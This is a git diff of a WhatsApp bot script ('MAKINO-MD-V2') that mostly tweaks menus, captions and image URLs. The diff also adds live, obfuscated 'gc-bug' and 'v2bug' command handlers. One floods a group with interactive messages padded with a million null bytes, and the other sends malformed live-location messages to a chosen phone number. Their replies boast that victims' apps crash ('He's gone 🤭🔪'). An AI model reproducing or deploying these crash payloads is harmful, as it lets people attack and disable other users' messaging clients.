-          {buttonId: `${prefix}megumin`, buttonText: {displayText: `>>`}, type: 1},
-               ] */
         let buttonzMessage = {
           image: { url: ud.data.url },
           caption: `Here it is...`,
@@ -4833,15 +4925,9 @@ case 'tovv': {
 
         reply(mess.waiting)
         waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)
-        /* var wbuttsss = [
-          {buttonId: `${prefix}awoo`, buttonText: {displayText: `>>`}, type: 1},
-          ] */
         let button1Messages = {
           image: { url: waifudd.data.url },
           caption: `Here it is...`,
-          /*  footer: `${global.BotName}`,
-          buttons: wbuttsss,
-          headerType: 2 */
 
         }
         await Taira.sendMessage(m.chat, button1Messages, { quoted: m }).catch(err => {
@@ -4957,14 +5043,9 @@ case 'tovv': {
         if (!m.isGroup) return reply(mess.grouponly);
         reply(mess.waiting)
         waifuddd = await axios.get('https://waifu.pics/api/sfw/waifu')
-        /*var wbuttsssr = [
-          {buttonId: `${prefix}waifu`, buttonText: {displayText: `>>`}, type: 1},
-          ] */
         let button4Messagess = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
-          /*buttons: wbuttsssr,
-          headerType: 4 */
+          caption: '♱MAKINO-MD-V2♱♡⃤',
         }
 
         await Taira.sendMessage(m.chat, button4Messagess, { quoted: m }).catch(err => {
@@ -4979,14 +5060,9 @@ case 'tovv': {
         if (!m.isGroup) return reply(mess.grouponly);
         reply(mess.waiting)
         waifuddd = await axios.get('https://waifu.pics/api/sfw/neko')
-        /*var wbuttsssr = [
-          {buttonId: `${prefix}neko`, buttonText: {displayText: `>>`}, type: 1},
-          ] */
         let buttonMessagessf = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
-          /*    buttons: wbuttsssr,
-              headerType: 2  */
+          caption: '♱MAKINO-MD-V2♱♡⃤',
         }
 
         await Taira.sendMessage(m.chat, buttonMessagessf, { quoted: m }).catch(err => {
@@ -5001,14 +5077,9 @@ case 'tovv': {
         if (!m.isGroup) return reply(mess.grouponly);
         reply(mess.waiting)
         waifuddd = await axios.get('https://waifu.pics/api/sfw/shinobu')
-        /* var wbuttsssr = [
-          {buttonId: `${prefix}loli`, buttonText: {displayText: `>>`}, type: 1},
-          ] */
         let buttonMessagessfgr = {
           image: { url: waifuddd.data.url },
-          caption: '🐦Makino-md-v2 ᴍᴜʟᴛɪ-ᴅᴇᴠɪᴄᴇ',
-          /*  buttons: wbuttsssr,
-            headerType: 2 */
+          caption: '♱MAKINO-MD-V2♱♡⃤',
         }
 
         await Taira.sendMessage(m.chat, buttonMessagessfgr, { quoted: m }).catch(err => {
@@ -5037,8 +5108,8 @@ case 'tovv': {
             contextInfo: {
               externalAdReply: {
                 showAdAttribution: true,
-                title: BotName,
-                body: `Sent in ${i.length} Group`,
+                title: '♱MAKINO-MD-V2♱♡⃤',
+                body: `Sent to ${i.length} Group`,
                 thumbnailUrl: 'https://telegra.ph/file/dfad7a7afb54498391945.jpg',
                 sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
                 mediaType: 1,
@@ -5100,6 +5171,7 @@ case 'tovv': {
 ╭═══════════════ ⪩
 ┃ • Addowner
 ┃ • delowner
+┃ • clear
 ┃ • ᴘᴜʙʟɪᴄ
 ┃ • self
 ┃ • ʀᴇꜱᴛᴀʀᴛ
@@ -5117,8 +5189,9 @@ case 'tovv': {
 ┃ • ᴜɴʙʟᴏᴄᴋ
 ┃ • ʙᴀɴ ᴀᴅᴅ
 ┃ • ʙᴀɴ ᴅᴇʟ
-┃ • getcase
-┃ • 
+┃ • GETCASE
+┃ • ANTICALL
+┃ • STATUSVIEW
 ╰════════════════ ⪨
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *BUGS*
@@ -5141,7 +5214,7 @@ case 'tovv': {
 ┃ • ɢʀᴏᴜᴘʟɪɴᴋ
 ┃ • ɪɴᴠɪᴛᴇ
 ┃ • ᴀᴅᴅ
-┃ •  savecontact
+┃ • savecontact
 ┃ • kick
 ┃ • left
 ┃ • ꜱᴇᴛɴᴀᴍᴇ
@@ -5167,7 +5240,7 @@ case 'tovv': {
 ╭═══════════════ ⪩
 ╰╮╰┈➤ *AI*
 ╭═══════════════ ⪩
-┃ • ᴄʜᴀᴛɢᴘᴛ 
+┃ • ɢᴘᴛ 
 ┃ • ᴅᴀʟʟᴇ 
 ┃ • ꜱᴀʏ
 ┃ • ꜰʟɪᴘᴛᴇxᴛ
@@ -5179,10 +5252,12 @@ case 'tovv': {
 ╭═══════════════ ⪩
 ┃ •  ᴘʟᴀʏ
 ┃ •  ᴠɪᴅᴇᴏ
+┃ •  YTDL
 ┃ •  ʏᴛᴍᴘ3
 ┃ •  ʏᴛᴍᴘ4
-┃ •  ytvideo
+┃ •  video
 ┃ •  ʟʏʀɪᴄꜱ
+┃ •  ᴀᴘᴋ
 ┃ •  ᴍᴏᴠɪᴇ
 ┃ •  mediafire
 ┃ •  ɢᴏᴏɢʟᴇ
@@ -5193,7 +5268,6 @@ case 'tovv': {
 ┃ •  ɪᴍᴀɢᴇ
 ┃ •  insta
 ┃ •  ꜱᴇᴀʀᴄʜ
-┃ •  searchgc
 ┃ •  ꜱᴇᴀʀᴄʜɢᴄ
 ┃ •  ᴡɪᴋɪᴍᴇᴅɪᴀ
 ┃ •  ʏᴛᴠɪᴅᴇᴏ
@@ -5412,7 +5486,8 @@ if(global.menutype === "v1"){
   await Taira.sendMessage(m.chat , { text: helpMenuText}, {quoted: statrp })
   } else if (global.menutype === "v3"){
   Taira.sendMessage(m.chat, {
-video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" }, 
+//video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" }, 
+video: { url: "https://widipe.com/file/jpaLRLZBBpPE.mp4" },
 caption: helpMenuText,
 gifPlayback: true,
 contextInfo: {
@@ -5427,7 +5502,7 @@ externalAdReply: {
 showAdAttribution: true,
 title: "♱MAKINO-MD-V2♱♡⃤",
 body: "Taira Makino",
-thumbnailUrl: "https://telegra.ph/file/dfad7a7afb54498391945.jpg",
+thumbnailUrl: "https://widipe.com/file/rGQFTKL2GoTF.jpg",
 sourceUrl: "https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r",
 mediaType: 1,
 renderLargerThumbnail: true
@@ -5439,14 +5514,15 @@ quoted: m
 } else if(global.menutype === "v4") {
 
   Taira.sendMessage(m.chat, {
-      video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" },
+      //video : { url: "https://graph.org/file/fad20d219e426d3c65e5f.mp4" },
+      video: { url: "https://widipe.com/file/jpaLRLZBBpPE.mp4" },
       gifPlayback: true,
       caption: helpMenuText,
       contextInfo: {
       externalAdReply: {
       title: '♱MAKINO-MD-V2♱♡⃤',
       body: 'Taira Makino',
-      thumbnailUrl: "https://telegra.ph/file/dfad7a7afb54498391945.jpg",
+      thumbnailUrl: "https://widipe.com/file/rGQFTKL2GoTF.jpg",
       sourceUrl: `https://whatsapp.com/channel/0029Vag5l2ALSmbi14YryJ2r`,
       mediaType: 1,
       renderLargerThumbnail: true
@@ -5478,16 +5554,6 @@ quoted: m
     }
 break;
 
-      case '':
-        if (isCmd) {
-          if (isBan) return reply(mess.banned);
-          if (isBanChat) return reply(mess.bangc);
-          Taira.sendMessage(from, { react: { text: "✨", key: m.key } })
-
-          reply(`Hi ${pushname}👋 ,I am MAKINO-MD-V2 by Tᴀɪʀᴀ Mᴀᴋɪɴᴏ. Do you need any help ?`)
-        }
-
-        break;
 
 
       //////search
@@ -5535,6 +5601,7 @@ let messg = `
 ┃ • ᴀᴜᴛᴏ-ꜱᴛᴀᴛᴜꜱ
 ┃ • ʀᴇᴄᴏʀᴅɪɴɢ
 ┃ • pmblocker
+┃ •  uptime
 ╰════════════════ ⪨
 `
 await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
@@ -5549,6 +5616,7 @@ let messg = `
 ╭═══════════════ ⪩
 ┃ • Addowner
 ┃ • Delowner
+┃ • clear
 ┃ • ᴘᴜʙʟɪᴄ
 ┃ • self
 ┃ • ʀᴇꜱᴛᴀʀᴛ
@@ -5566,8 +5634,9 @@ let messg = `
 ┃ • ᴜɴʙʟᴏᴄᴋ
 ┃ • ʙᴀɴ ᴀᴅᴅ
 ┃ • ʙᴀɴ ᴅᴇʟ
-┃ • getcase
-┃ •
+┃ • GETCASE
+┃ • ANTICALL
+┃ • STATUSVIEW 
 ╰════════════════ ⪨
 `
 await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
@@ -5587,7 +5656,7 @@ let messg = `
 ┃ • ɢʀᴏᴜᴘʟɪɴᴋ
 ┃ • ɪɴᴠɪᴛᴇ
 ┃ • ᴀᴅᴅ
-┃ •  savecontact
+┃ • savecontact
 ┃ • kick
 ┃ • left
 ┃ • Antibot
@@ -5641,9 +5710,9 @@ let messg = `
 ╭═══════════════ ⪩
 ┃ •  ᴘʟᴀʏ
 ┃ •  ᴠɪᴅᴇᴏ
-┃ •  ʏᴛᴍᴘ3
+┃ •  YTDL
 ┃ •  ʏᴛᴍᴘ4
-┃ •  ytvideo
+┃ •  video
 ┃ •  ʟʏʀɪᴄꜱ
 ┃ •  ᴍᴏᴠɪᴇ
 ┃ •  mediafire
@@ -5655,7 +5724,6 @@ let messg = `
 ┃ •  ɪᴍᴀɢᴇ
 ┃ •  insta
 ┃ •  ꜱᴇᴀʀᴄʜ
-┃ •  searchgc
 ┃ •  ꜱᴇᴀʀᴄʜɢᴄ
 ┃ •  ᴡɪᴋɪᴍᴇᴅɪᴀ
 ┃ •  ʏᴛᴠɪᴅᴇᴏ
@@ -5882,20 +5950,14 @@ await Taira.sendMessage(m.chat, { text: messg }, { quoted: statrp })
 }
 break
 
-/* case 'gc-bug': {
-const _0x508f74=_0x1757;(function(_0x243297,_0x492073){const _0x67fb79=_0x1757,_0x2ab2e6=_0x243297();while(!![]){try{const _0x427c31=-parseInt(_0x67fb79(0x1e1))/0x1*(parseInt(_0x67fb79(0x1f0))/0x2)+parseInt(_0x67fb79(0x1ee))/0x3*(-parseInt(_0x67fb79(0x1db))/0x4)+parseInt(_0x67fb79(0x1e6))/0x5+-parseInt(_0x67fb79(0x1ef))/0x6+-parseInt(_0x67fb79(0x1df))/0x7*(parseInt(_0x67fb79(0x1e0))/0x8)+-parseInt(_0x67fb79(0x1f1))/0x9+parseInt(_0x67fb79(0x1e4))/0xa;if(_0x427c31===_0x492073)break;else _0x2ab2e6['push'](_0x2ab2e6['shift']());}catch(_0x1cd7af){_0x2ab2e6['push'](_0x2ab2e6['shift']());}}}(_0x49bb,0x46015));function _0x49bb(){const _0x55f7cd=['chat','2815057ZynBKR','8rulflH','1nFNFTn','cta_url','https://chat.whatsapp.com/','14831070UkaSSn','split','1629975huviQq','Message','relayMessage','♱MAKINO-MD-V2♱♡⃤','botowner','groupAcceptInvite','.\x20🔥\x20\x0a\x0a\x20Wait\x20some\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account.','\x20Using\x20','57eYxmSp','2151966EGwNeH','175118hUdhES','2549637okRIUQ','key','You\x20have\x20\x20Successfully\x20Sent\x20Bugs\x20to\x20','82252dhVhRg','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20♱MAKINO-MD-V2♱♡⃤','\x20https://chat.whatsapp.com/'];_0x49bb=function(){return _0x55f7cd;};return _0x49bb();}function _0x1757(_0x43b002,_0xcef31e){const _0x49bbf6=_0x49bb();return _0x1757=function(_0x1757a3,_0x3d0945){_0x1757a3=_0x1757a3-0x1db;let _0xa6f313=_0x49bbf6[_0x1757a3];return _0xa6f313;},_0x1757(_0x43b002,_0xcef31e);}if(!isCreator)return reply(mess[_0x508f74(0x1ea)]);if(!q)return reply('Use\x20like\x20.'+command+_0x508f74(0x1dd));await loading();let result=args[0x0][_0x508f74(0x1e5)](_0x508f74(0x1e3))[0x1],target=await Taira[_0x508f74(0x1eb)](result);for(let j=0x0;j<0x5;j++){var etc=generateWAMessageFromContent(m['chat'],proto[_0x508f74(0x1e7)]['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x508f74(0x1e9)},'footer':{'text':_0x508f74(0x1dc)},'nativeFlowMessage':{'buttons':[{'name':_0x508f74(0x1e2),'buttonParamsJson':'{\x20display_text\x20:\x20\x27⿻Taira\x20Makino⿻\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}'}],'messageParamsJson':'\x00'['repeat'](0xf4240)}}}}}),{'userJid':m[_0x508f74(0x1de)],'quoted':statrp});await Taira[_0x508f74(0x1e8)](target,etc['message'],{'messageId':etc[_0x508f74(0x1f2)]['id']}),await sleep(0x2bc);}reply(_0x508f74(0x1f3)+target+_0x508f74(0x1ed)+command+_0x508f74(0x1ec));
-}
-break */
+
 case 'gc-bug': {
 const _0x414556=_0x2375;function _0x5f13(){const _0x754b60=['2095356iiiUUd','127631dWHuqR','chat','524070spGpND','You\x20have\x20\x20Successfully\x20Sent\x20Bugs\x20to\x20','.\x20🔥\x20\x0a\x0a\x20Wait\x20some\x20minutes\x20or\x20say\x20cheese\x20to\x20your\x20account.','{\x20display_text\x20:\x20\x27⿻Taira\x20Makino⿻\x27,\x20url\x20:\x20,\x20merchant_url\x20:\x20\x20}','Message','2825784yRHRmy','groupAcceptInvite','♱MAKINO-MD-V2♱♡⃤','cta_url','message','152PovIfN','split','relayMessage','396420JqLokw','9VmKKdN','repeat','119694jPFcUR','9907390MJCiPv','Processing\x20.....','5AqKOoO','Use\x20like\x20.','\x20Using\x20'];_0x5f13=function(){return _0x754b60;};return _0x5f13();}(function(_0xff205e,_0x430d2f){const _0xe6bbe8=_0x2375,_0x3f5a16=_0xff205e();while(!![]){try{const _0x2b2510=parseInt(_0xe6bbe8(0x154))/0x1+parseInt(_0xe6bbe8(0x160))/0x2+-parseInt(_0xe6bbe8(0x14c))/0x3+-parseInt(_0xe6bbe8(0x15d))/0x4+parseInt(_0xe6bbe8(0x15a))/0x5*(parseInt(_0xe6bbe8(0x157))/0x6)+-parseInt(_0xe6bbe8(0x15e))/0x7*(-parseInt(_0xe6bbe8(0x151))/0x8)+parseInt(_0xe6bbe8(0x155))/0x9*(parseInt(_0xe6bbe8(0x158))/0xa);if(_0x2b2510===_0x430d2f)break;else _0x3f5a16['push'](_0x3f5a16['shift']());}catch(_0x4b377c){_0x3f5a16['push'](_0x3f5a16['shift']());}}}(_0x5f13,0x863ab));if(!isCreator)return reply(mess['botowner']);if(!q)return reply(_0x414556(0x15b)+command+'\x20https://chat.whatsapp.com/');reply(_0x414556(0x159));let result=args[0x0][_0x414556(0x152)]('https://chat.whatsapp.com/')[0x1],target=await Taira[_0x414556(0x14d)](result);function _0x2375(_0x4a22a1,_0x14330c){const _0x5f13b2=_0x5f13();return _0x2375=function(_0x2375cd,_0x56309c){_0x2375cd=_0x2375cd-0x148;let _0xa0907c=_0x5f13b2[_0x2375cd];return _0xa0907c;},_0x2375(_0x4a22a1,_0x14330c);}for(let j=0x0;j<0x5;j++){var etc=generateWAMessageFromContent(m[_0x414556(0x15f)],proto[_0x414556(0x14b)]['fromObject']({'viewOnceMessage':{'message':{'interactiveMessage':{'header':{'title':'','subtitle':'\x20'},'body':{'text':_0x414556(0x14e)},'footer':{'text':'›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20♱MAKINO-MD-V2♱♡⃤'},'nativeFlowMessage':{'buttons':[{'name':_0x414556(0x14f),'buttonParamsJson':_0x414556(0x14a)}],'messageParamsJson':'\x00'[_0x414556(0x156)](0xf4240)}}}}}),{'userJid':m[_0x414556(0x15f)],'quoted':statrp});await Taira[_0x414556(0x153)](target,etc[_0x414556(0x150)],{'messageId':etc['key']['id']}),await sleep(0x2bc);}reply(_0x414556(0x148)+target+_0x414556(0x15c)+command+_0x414556(0x149));
   }
 break
 
 
-/*case 'v2bug': {
-const _0x3b65a6=_0x1c16;function _0x1c16(_0x82e00b,_0x16a393){const _0xb1f5d9=_0xb1f5();return _0x1c16=function(_0x1c16dd,_0x400b92){_0x1c16dd=_0x1c16dd-0xe2;let _0x48f65a=_0xb1f5d9[_0x1c16dd];return _0x48f65a;},_0x1c16(_0x82e00b,_0x16a393);}(function(_0x552e2c,_0x1d6c56){const _0x58750d=_0x1c16,_0x12eeaa=_0x552e2c();while(!![]){try{const _0x4a483c=-parseInt(_0x58750d(0xee))/0x1+parseInt(_0x58750d(0xf0))/0x2+parseInt(_0x58750d(0xed))/0x3+-parseInt(_0x58750d(0xf1))/0x4+parseInt(_0x58750d(0xec))/0x5+parseInt(_0x58750d(0xe5))/0x6*(parseInt(_0x58750d(0xe3))/0x7)+-parseInt(_0x58750d(0xef))/0x8;if(_0x4a483c===_0x1d6c56)break;else _0x12eeaa['push'](_0x12eeaa['shift']());}catch(_0x42b75c){_0x12eeaa['push'](_0x12eeaa['shift']());}}}(_0xb1f5,0x50f4a));if(!isCreator)return reply(mess[_0x3b65a6(0xe6)]);if(!q)return reply('Use\x20like\x20.'+command+_0x3b65a6(0xe7));let one=q[_0x3b65a6(0xeb)]('|')[0x0],two=one[_0x3b65a6(0xea)](/[^0-9]/g,'');if(two['startsWith']('0'))return reply(_0x3b65a6(0xf3));let target=two+'@s.whatsapp.net',count=q['split']('|')[0x1];await loading();for(let j=0x0;j<count;j++){var etc=generateWAMessageFromContent(m['chat'],proto[_0x3b65a6(0xe4)][_0x3b65a6(0xe8)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':_0x3b65a6(0xf2),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':target,'quoted':m});await Taira['relayMessage'](target,etc['message'],{'messageId':etc[_0x3b65a6(0xe2)]['id']});}function _0xb1f5(){const _0x283cb8=['100722QiGqQy','botowner','\x202347080968564|1','fromObject','He\x27s\x20gone\x20🤭🔪\x0aIf\x20he\x20isn\x27t\x20dead,\x20use\x20a\x20higher\x20amount.','replace','split','2335660cvIhQH','1759815AOcgMu','254837liajaH','5481960greGRZ','355864iJVVNk','108564xpxbtg','♱MAKINO-MD-V2♱♡⃤','Target\x20number\x20cannot\x20start\x20with\x200.','key','28DZgcxE','Message'];_0xb1f5=function(){return _0x283cb8;};return _0xb1f5();}await reply(_0x3b65a6(0xe9));
-}
-break*/
+
 case 'v2bug': {
 const _0x406bbf=_0x2616;function _0x2616(_0xea05d8,_0x307608){const _0x4f6cf2=_0x4f6c();return _0x2616=function(_0x26166b,_0x370468){_0x26166b=_0x26166b-0x115;let _0x24412f=_0x4f6cf2[_0x26166b];return _0x24412f;},_0x2616(_0xea05d8,_0x307608);}function _0x4f6c(){const _0x394049=['botowner','Message','558tvTHWH','He\x27s\x20gone\x20🤭🔪\x0aIf\x20he\x20isn\x27t\x20dead,\x20use\x20a\x20higher\x20amount.','Processing.....','1056714qKaLqV','message','Use\x20like\x20.','373612LbuKwd','chat','replace','startsWith','1639888qzwWCh','3tZGYOm','fromObject','\x202347080968564|1','12dkkirz','124980SUiggd','@s.whatsapp.net','905884xinOSZ','split','110853tdzGBs','Target\x20number\x20cannot\x20start\x20with\x200.'];_0x4f6c=function(){return _0x394049;};return _0x4f6c();}(function(_0x431267,_0x1336e4){const _0x3d5068=_0x2616,_0x1ca78f=_0x431267();while(!![]){try{const _0x356dca=parseInt(_0x3d5068(0x124))/0x1+-parseInt(_0x3d5068(0x117))/0x2*(-parseInt(_0x3d5068(0x11c))/0x3)+parseInt(_0x3d5068(0x11f))/0x4*(-parseInt(_0x3d5068(0x120))/0x5)+-parseInt(_0x3d5068(0x12b))/0x6+-parseInt(_0x3d5068(0x122))/0x7+parseInt(_0x3d5068(0x11b))/0x8+parseInt(_0x3d5068(0x128))/0x9;if(_0x356dca===_0x1336e4)break;else _0x1ca78f['push'](_0x1ca78f['shift']());}catch(_0x3d69bf){_0x1ca78f['push'](_0x1ca78f['shift']());}}}(_0x4f6c,0x1dd4c));if(!isCreator)return reply(mess[_0x406bbf(0x126)]);if(!q)return reply(_0x406bbf(0x116)+command+_0x406bbf(0x11e));let one=q[_0x406bbf(0x123)]('|')[0x0],two=one[_0x406bbf(0x119)](/[^0-9]/g,'');if(two[_0x406bbf(0x11a)]('0'))return reply(_0x406bbf(0x125));let target=two+_0x406bbf(0x121),count=q[_0x406bbf(0x123)]('|')[0x1];reply(_0x406bbf(0x12a));for(let j=0x0;j<count;j++){var etc=generateWAMessageFromContent(m[_0x406bbf(0x118)],proto[_0x406bbf(0x127)][_0x406bbf(0x11d)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'♱MAKINO-MD-V2♱♡⃤','sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':target,'quoted':m});await Taira['relayMessage'](target,etc[_0x406bbf(0x115)],{'messageId':etc['key']['id']});}await reply(_0x406bbf(0x129));
 }
@@ -5964,8 +6026,6 @@ if (stdout) return reply(`${stdout}`)
 	}
      }
   } catch (err) {
-   // Taira.sendMessage(`${ownertag}@s.whatsapp.net`, util.format(err), { quoted: m })
-    //Taira.sendMessage('2347080968564@s.whatsapp.net', util.format(err), { quoted: m })
     console.log(err)
     let e = String(err)
     if (e.includes("not-authorized")) return
